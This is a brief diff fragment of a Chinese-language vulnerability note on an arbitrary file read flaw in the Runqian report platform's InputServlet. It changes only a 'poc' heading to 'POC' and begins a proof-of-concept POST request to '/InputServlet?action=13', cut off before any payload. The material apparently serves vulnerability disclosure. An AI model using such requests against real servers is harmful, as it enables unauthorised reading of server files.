@@ -1,7 +1,7 @@
 ## 润乾报表平台InputServlet存在任意文件读取漏洞
 
 
-## poc
+## POC
 ```
 POST /InputServlet?action=13 HTTP/1.1
 Host: 
